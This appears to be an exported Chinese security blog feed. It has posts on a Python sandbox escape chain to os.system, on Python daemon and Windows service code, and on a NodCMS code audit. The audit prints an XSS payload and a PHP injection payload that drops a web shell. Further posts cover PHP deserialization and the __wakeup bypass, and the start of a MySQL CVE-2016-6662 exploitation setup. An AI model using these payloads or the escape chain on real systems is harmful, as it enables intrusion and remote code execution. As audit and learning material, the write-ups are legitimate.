&lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60])&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys())['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25])linecache&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'])&lt;module 'linecache' from 'C:\mySoft\python2.7.9\lib\linecache.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys())['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()[12])os&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12])&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys())['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys()[79])system&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.values()[79]('type test.txt'))this is a test!0 当然，还有很多方式]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>python</tag>
        <tag>excape</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 版的守护进程和Windows服务]]></title>
    <url>%2F2016%2F10%2F22%2Fpython-linux-daemon-windows-service%2F</url>
    <content type="text"><![CDATA[概述最近在写python脚本时需要用到Linux的守护进程以及Windows下的服务进程。百度了挺多，都记下来，以后如果再次遇到这种问题就不用去找了。 Linux守护进程最重要的特性是后台运行；它必须与其运行前的环境隔离开来，这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等；它可以在系统启动时从启动脚本/etc/rc.d中启动，可以由inetd守护进程启动，也可以有作业规划进程crond启动，还可以由用户终端（通常是shell）执行。Python有时需要保证只运行一个脚本实例，以避免数据的冲突。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加守护进程（linux）'''import osimport datetimeimport timeimport sysimport atexitimport string import subprocessfrom signal import SIGTERM from lib.function import confdealclass Daemon: #需要获取调试信息，改为stdin='/dev/stdin', stdout='/dev/stdout', stderr='/dev/stderr'，以root身份运行。 def __init__(self, scriptPath,pidfile, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'): self.stdin = stdin self.stdout = stdout self.stderr = stderr self.pidfile = pidfile self.scriptPath = scriptPath def _daemonize(self): try: pid = os.fork() #第一次fork，生成子进程，脱离父进程 if pid &gt; 0: sys.exit(0) #退出主进程 except OSError, e: sys.stderr.write('fork #1 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) os.chdir("/") #修改工作目录 os.setsid() #设置新的会话连接 os.umask(0) #重新设置文件创建权限 try: pid = os.fork() #第二次fork，禁止进程打开终端 if pid &gt; 0: sys.exit(0) except OSError, e: sys.stderr.write('fork #2 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) #重定向文件描述符 sys.stdout.flush() sys.stderr.flush() si = file(self.stdin, 'r') so = file(self.stdout, 'a+') se = file(self.stderr, 'a+', 0) os.dup2(si.fileno(), sys.stdin.fileno()) os.dup2(so.fileno(), sys.stdout.fileno()) os.dup2(se.fileno(), sys.stderr.fileno()) #注册退出函数，根据文件pid判断是否存在进程 atexit.register(self.delpid) pid = str(os.getpid()) file(self.pidfile,'w+').write('%s\n' % pid) def delpid(self): os.remove(self.pidfile) def start(self): #检查pid文件是否存在以探测是否存在进程 try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if pid: message = 'pidfile %s already exist. Daemon already running!\n' sys.stderr.write(message % self.pidfile) sys.exit(1) #启动监控 self._daemonize() self._run() def stop(self): #从pid文件中获取pid try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if not pid: #重启不报错 message = 'pidfile %s does not exist. Daemon not running!\n' sys.stderr.write(message % self.pidfile) return #杀进程 # 我的程序需要，只是获取端口号 remoteDic = confdeal.getConfRemote(self.scriptPath) if remoteDic: # 根据端口号杀掉子进程 ret = os.popen('netstat -antup | grep \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr.split('/')[0] pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("kill "+pidStr) try: while 1: os.kill(pid, SIGTERM) time.sleep(0.1) #os.system('hadoop-daemon.sh stop datanode') #os.system('hadoop-daemon.sh stop tasktracker') #os.remove(self.pidfile) except OSError, err: err = str(err) if err.find('No such process') &gt; 0: if os.path.exists(self.pidfile): os.remove(self.pidfile) else: print str(err) sys.exit(1) def restart(self): self.stop() self.start() def _run(self): # 开启子进程 cmd = 'cd ' + self.scriptPath +' &amp;&amp; python test.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) daemon = Daemon(scriptPath,'/tmp/watch_process.pid', stdout = '/tmp/watch_stdout.log') if len(sys.argv) == 2: if 'start' == sys.argv[1]: daemon.start() elif 'stop' == sys.argv[1]: daemon.stop() elif 'restart' == sys.argv[1]: daemon.restart() else: print 'unknown command' sys.exit(2) sys.exit(0) else: print 'usage: %s start|stop|restart' % sys.argv[0] sys.exit(2) WindowsPython程序作为Windows服务启动，需要安装pywin32包。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加windows服务'''import pythoncomimport win32serviceutilimport win32serviceimport win32eventimport servicemanagerimport socketimport osimport sysimport subprocessimport timefrom lib.function import confdealclass Daemon (win32serviceutil.ServiceFramework): _svc_name_ = "Test Service" #服务名 _svc_display_name_ = "Test Service" #服务显示名称 _svc_description_ = "Test Service ." #服务描述 def __init__(self,args): win32serviceutil.ServiceFramework.__init__(self,args) self.hWaitStop = win32event.CreateEvent(None,0,0,None) socket.setdefaulttimeout(60) def SvcDoRun(self): servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_,'')) self.monitorProcess() # 创建子进程 def monitorProcess(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): cmd = 'cd '+scriptPath+' &amp;&amp; python promain.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10) win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE) # 结束子进程 def SvcStop(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): remoteDic = confdeal.getConfRemote(scriptPath) if remoteDic: ret = os.popen('netstat -ano | findstr \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("taskkill /F /T /PID "+pidStr) else : exit() self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) win32event.SetEvent(self.hWaitStop) self.ReportServiceStatus(win32service.SERVICE_STOPPED)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) with open('C:\\filemonitor', 'w') as f: f.write(scriptPath) confdeal.initConf(scriptPath) win32serviceutil.HandleCommandLine(Daemon) 然后以下命令： 123456789101112# 安装服务python PythonService.py install# 让服务自动启动python PythonService.py --startup auto install # 启动服务python PythonService.py start# 重启服务python PythonService.py restart# 停止服务python PythonService.py stop# 删除/卸载服务python PythonService.py remove 这里我要提一下，python脚本文件调用windows api后，他的运行路径会发生变化，所以我这里把脚本路径存到了一个绝对地址的文件里，然后再取出来。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>linux</tag>
        <tag>python</tag>
        <tag>daemon</tag>
        <tag>service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php codeigniter nodcms 代码审计]]></title>
    <url>%2F2016%2F10%2F11%2Fphp-codeigniter-nodcms-audit%2F</url>
    <content type="text"><![CDATA[概述CMS代码审计还未入门，然后CI框架学的还不行，代码审计一脸懵逼。 前台反射型XSS1234567891011121314151617181920212223242526272829function search($lang)&#123; $this-&gt;preset($lang); $search_text = isset($_GET["filter"])?str_replace("'","",$this-&gt;input-&gt;get("filter")):""; //把单引号去掉 if($search_text!="")&#123; $search = explode("_",$search_text); if(count($search)!="")&#123; $limit = 20; if(isset($_GET["offset"]) &amp;&amp; is_numeric($_GET["offset"]))&#123; $offset = $_GET["offset"]; &#125;else&#123; $offset = 0; &#125; $this-&gt;data['data'] = $this-&gt;NodCMS_general_model-&gt;searchExtension($search,$limit,$offset); &#125; $this-&gt;data['search_word']=str_replace("_"," ",$search_text); $this-&gt;data['text_search']=$search; $this-&gt;data['text_replace']=array_map(function($value)&#123; return "&lt;strong&gt;".$value."&lt;/strong&gt;"; &#125;,$search); &#125;else&#123; $this-&gt;data['data'] = array(); &#125; $this-&gt;data['title']=str_replace("_"," ",$search_text); //把下划线替换为空格，并没有进行XSS过滤，直接打印出来，形成xss if(isset($_GET["ajax"]))&#123; echo $this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search_ajax',$this-&gt;data,true); &#125;else&#123; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data,''); &#125;&#125; 这里，只是去掉了单引号、下划线虽然难以进行sql注入攻击，但是XSS还是可以的。 1payload为：http://localhost:8000/en/search?filter=des&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt; 后台php 代码注入位置是修改语言的地方，其中一个URL为http://localhost:8000/admin/edit_lang_file/1/en。 先看截图： 然后上关键代码，关键地方打上注释了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687function edit_lang_file($id,$file_name)&#123; $this-&gt;data['data']=$this-&gt;NodCMS_general_admin_model-&gt;get_language_detail($id); if($this-&gt;data['data']==null || !file_exists(getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'))&#123; $this-&gt;session-&gt;set_flashdata('error', _l('URL-Request was not exists!',$this)); redirect(base_url()."admin/language"); &#125; $this-&gt;load-&gt;library('Get_lang_in_array'); $CI = new Get_lang_in_array(); //实例化Get_lang_in_array()函数 $this-&gt;data['lang_list'] = $CI-&gt;load($file_name,$this-&gt;data['data']['language_name']); //加载en_lang.php if(count($this-&gt;data['lang_list'])==0)&#123; $defaultLangFileName = strlen($file_name)==2?$_SESSION['language']['code']:$file_name; $this-&gt;data['lang_list'] = $CI-&gt;load($defaultLangFileName,$_SESSION['language']['language_name']); &#125; if(isset($_POST['data']))&#123; if ($this-&gt;session-&gt;userdata['group']==1) &#123; $post_data = $this-&gt;input-&gt;post('data'); //直接获取post值 $i=0; $fileContent = "&lt;?php\n"; foreach ($this-&gt;data['lang_list'] as $key=&gt;&amp;$val) &#123; $fileContent .= '$lang["'.$key.'"] = "'.$post_data[$i].'";'."\n"; //拼接代码 $val = $post_data[$i]; $i++; &#125; $file = getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'; if(file_exists($file))&#123; file_put_contents($file, $fileContent); // 把代码写入文件 &#125; $this-&gt;session-&gt;set_flashdata('success', _l('Edit language file successfully!',$this)); redirect(base_url()."admin/edit_lang_file/".$id.'/'.$file_name); &#125;else&#123; $this-&gt;session-&gt;set_flashdata('error', _l('This request is just fore real admin.',$this)); redirect(base_url()."admin/language"); &#125; &#125; $this-&gt;data['file_name'] = $file_name; $this-&gt;data['languages']=$this-&gt;NodCMS_general_admin_model-&gt;get_all_language(); $this-&gt;data['title'] = _l("Edit language file",$this); $this-&gt;data['page'] = "edit lang file"; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/language_edit_file',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data);&#125;function load($langfile = '', $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '') &#123; $langfile = str_replace('.php', '', $langfile); if ($add_suffix == TRUE) &#123; $langfile = str_replace('_lang.', '', $langfile) . '_lang'; &#125; $langfile .= '.php'; if (in_array($langfile, $this-&gt;is_loaded, TRUE)) &#123; return; &#125; $config = &amp; get_config(); if ($idiom == '') &#123; $deft_lang = (!isset($config['language'])) ? 'english' : $config['language']; $idiom = ($deft_lang == '') ? 'english' : $deft_lang; &#125; if ($alt_path != '' &amp;&amp; file_exists($alt_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($alt_path . 'language/' . $idiom . '/' . $langfile); &#125; else &#123; $found = FALSE; foreach (get_instance()-&gt;load-&gt;get_package_paths(TRUE) as $package_path) &#123; if (file_exists($package_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($package_path . 'language/' . $idiom . '/' . $langfile); $found = TRUE; break; &#125; &#125; if ($found !== TRUE) &#123; show_error('Unable to load the requested language file: language/' . $idiom . '/' . $langfile); &#125; &#125; if (!isset($lang)) &#123; log_message('error', 'Language file contains no data: language/' . $idiom . '/' . $langfile); return; &#125; if ($return == TRUE) &#123; return $lang; &#125; $this-&gt;is_loaded[] = $langfile; //加载 en_lang.php文件，即执行代码。 $this-&gt;language = array(); $this-&gt;language = $lang; return $this-&gt;language; unset($lang); log_message('debug', 'Language file loaded: language/' . $idiom . '/' . $langfile); return TRUE;&#125; 代码比较复杂，加上对CI框架不是很了解，看的比较久。由于这里没有对post提交的参数进行任何的字符过滤，直接进行拼接，然后保存到文件。之后重新请求时，实例化了Get_lang_in_array()这个函数，而这个函数主要加载了en_lang.php这个文件，也就是执行了这个文件，形成代码注入，从而gershell。 1payload为：All"; file_put_contents('shell.php', '&lt;?php $_GET[a]($_GET[b]);?&gt;');;$t="111 shell.php文件会生成在根目录下，连菜刀就可以了。 存储型XSS和前台差不多，没有过滤就存入了数据库，造成XSS。]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>php</tag>
        <tag>codeigniter</tag>
        <tag>nodcms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 序列化以及 magic 函数]]></title>
    <url>%2F2016%2F10%2F09%2Fphp-serialize-magic%2F</url>
    <content type="text"><![CDATA[概述有时候需要把一个对象在网络上传输，为了方便传输，可以把整个对象转化为二进制串，等到达另一端时，再还原为原来的对象，这个过程称之为也叫序列化。 有两种情况我们必须把对象也叫序列化，第一种情况就是把一个对象在网络中传输的时候要将对象也叫序列化，第二种情况就是把对象写入文件或是数据库的时候用到也叫序列化。 串行化有两个过程，一个是序列化，就是把对象转化为二进制的字符串，我们使用serialize()函数来序列化一个对象，另一个是反序列化，就是把对象转化的二进制字符串再转化为对象， 我们使用unserialize()函数来反序列化一个对象。 详情1234567891011121314151617181920212223242526&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20my friends has Alice Jhon . 至于序列化语法解析，看如下代码： 1234567891011121314151617181920&lt;?phperror_reporting(7);class Person&#123; public $name; private $age; protected $friends; var $job; function __construct($name = "Bob", $age = 20,$friends =array("Alice","Jhon") ,$job=Null) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; $this-&gt;job = $job; &#125;&#125;$p1 = new Person();$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2?&gt; 具体输出： 1O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 需要序列化一个类的话，首先PHP会先将类名序列化。格式为 O:类名长度:”类名”:值:{} ,大致Fuzzy了下，这个类名长度前可以有%2b、%30 这些符号也可以反序列化。其他的格式可以自己对照了解。如： 1O:+6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 1O:06:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 以下是zval对应的类型和键对照表1234567891011数组中二次赋值(&amp;): R; 对象二次赋值 : r; NULL : N; true : b:1; false : b:0; Long : i; Double : d; String : s/S; Class : C; Array : a; Object : O; 可以看出变量不同的属性也有着不同的格式 123public : key; protected : *key; private : 对象名key; 魔术方法在PHP5中有两个魔术方法__sleep()方法和__wakeup()方法，在对象串行化的时候，会调用一个sleep()方法来完成一 些睡前的事情；而在重新醒来，即由二进制串重新组成一个对象的时候，则会自动调用PHP的另一个函数wakeup()，做一些对象醒来就要做的动作。sleep()函数不接受任何参数， 但返回一个数组，其中包含需要串行化的属性。末被包含的属性将在串行化时被忽略，如果没有sleep()方法，PHP将保存所有属性。当然，还有其他的魔术方法。 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __sleep() &#123; // 此时，属性$age将被删除！！！ $arr = array("name", "friends"); return($arr); &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 $this-&gt;name = "Orleven"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Orleven,my age is my friends has Alice Jhon . 不久之前刚出来的__wakeup()引发的漏洞。大意是指，当我们反序列化一个对象时，如果它的属性发生了变化，就会导致wakeup函数中不会执行，那么如果__wakeup()中存在一些重要的语句，就会导致不会被执行。 对于如下代码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . ",my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 echo "Wakeup...&lt;br/&gt;"; $this-&gt;name = "Orleven"; echo "Wakeuped&lt;br/&gt;"; &#125; function __destruct()&#123; //Do something $this-&gt;say(); echo "Destructed&lt;br/&gt;"; &#125;&#125; 如果执行如下代码：123$p1_string = 'O:6:"Person":3:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p1_string."&lt;br/&gt;";$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2 具体输出： 12345O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; Wakeup... Wakeuped I am Orleven,my age is 20,my friends has Alice Jhon . Destructed 如果执行如下代码：123$p3_string = 'O:6:"Person":4:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p3_string."&lt;br/&gt;";$p4 = unserialize($p3_string); //把一个序列化的字符串反序列化形成对象$p4 具体输出： 123O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20,my friends has Alice Jhon . Destructed 发现wakeup并没有执行。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>serialize</tag>
        <tag>magic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 提权漏洞 CVE-2016-6662]]></title>
    <url>%2F2016%2F09%2F29%2Fmysql-root-code-execution-CVE-2016-6662%2F</url>
    <content type="text"><![CDATA[概述最近出了一个mysql提权漏洞，趁热练练手。 利用前提 mysql_hookandroot_lib.c mysql拥有my.cnf写权限 mysql root用户可执行 set global general_log_file = &#39;my.cnf&#39;; sql语句 需要file权限 环境搭建安装mysql 5.6.3212345678910111213141516171819202122232425$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz$ sudo apt-get install libaio-dev（或者libaio1） $ chmod 777 tmp$ groupadd mysql$ useradd -r -g mysql mysql$ cd /usr/local/$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz $ ln -s mysql-5.6.32-linux-glibc2.5-x86_64 mysql$ cd mysql $ chown -R mysql .$ chgrp -R mysql .$ scripts/mysql_install_db --user=mysql$ chown -R root .$ chown -R mysql data$ cp my.cnf /etc/my.cnf$ bin/mysqld_safe --user=mysql &amp;$ cp support-files/mysql.server /etc/init.d/mysql.server$ ./bin/mysqladmin -u root password '123456'$ ./bin/mysqladmin -uroot -p123456 shutdown$ bin/mysqld_safe --user=mysql &amp;# 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：$ vi /etc/environment # 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）$ source /etc/environment 版本信息123456789101112131415161718192021222324$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.4 LTSRelease: 14.04Codename: trusty$ 